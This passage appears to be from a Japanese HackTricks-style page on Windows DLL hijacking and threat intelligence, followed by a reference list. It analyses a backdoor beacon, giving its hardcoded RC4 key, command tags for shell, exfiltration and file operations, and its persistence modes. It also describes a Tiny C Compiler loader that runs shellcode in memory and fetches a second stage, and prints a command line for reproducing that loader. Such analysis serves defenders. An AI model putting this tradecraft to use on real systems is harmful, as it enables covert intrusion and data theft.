- ビーコンはドット区切りのホストプロファイルを構築し、タグ `4Q` を前置してからHTTPS経由で `HttpSendRequestA` する前にキー `vAuig34%^325hGV` でRC4暗号化します。レスポンスはRC4で復号され、タグスイッチで振り分けられます（`4T` shell、`4V` process exec、`4W/4X` file write、`4Y` read/exfil、`4\\` uninstall、`4` drive/file enum + chunked transfer ケース）。
- 実行モードはCLI引数で制御されます: 引数なし = 永続化をインストール（service/Runキー）→ 宛先は `-i`；`-i` は自身を `-k` 付きで再起動；`-k` はインストールをスキップしてpayloadを実行します。

観測された別のローダー
- 同じ侵入は Tiny C Compiler をドロップし、`C:\ProgramData\USOShared\` から `svchost.exe -nostdlib -run conf.c` を実行し、`libtcc.dll` を隣に置きました。攻撃者提供のCソースはshellcodeを埋め込み、コンパイルされ、PEでディスクに触れることなくメモリ上で実行されました。再現するには:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- この TCC ベースの compile-and-run ステージは、実行時に `Wininet.dll` をインポートし、ハードコードされた URL から second-stage shellcode を取得して、コンパイラの実行を偽装する柔軟な loader を実現しました。

## 参考文献

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../../banners/hacktricks-training.md}}
